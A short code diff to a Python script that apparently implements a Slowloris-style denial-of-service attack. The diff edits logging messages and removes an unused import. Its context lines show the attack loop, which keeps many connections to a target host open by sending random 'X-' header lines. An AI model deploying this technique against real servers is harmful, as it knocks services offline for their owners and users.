@@ -1,5 +1,4 @@
 #!/usr/bin/env python
-import os
 import sys
 import socket
 import time
@@ -87,10 +86,8 @@ def init_attack(nAttackers):
 
 def main():
     logging.info("Attacking {} with {} attackers".format(host, connections))  
-    logging.info("Creating attacker | ID: {}".format(identifier))
+    logging.info("Establishing connections..")
     attackers = []
-    
-    
 
     for x in range((connections)):
         try:
@@ -100,8 +97,7 @@ def main():
 
     while True:
         try:
-            logging.info("Info attack {} with {} attackers".format(host, connections))
-            logging.info("X-{}: {}\r\n".format(randint(0, 50000), randint(0, 50000)).encode())
+            logging.info("Keeping {} attacker connections alive.. ".format(len(attackers)))
             for s in list(attackers):
                 try:
                     s.socket.send("X-{}: {}\r\n".format(randint(0, 50000), randint(0, 50000)).encode())
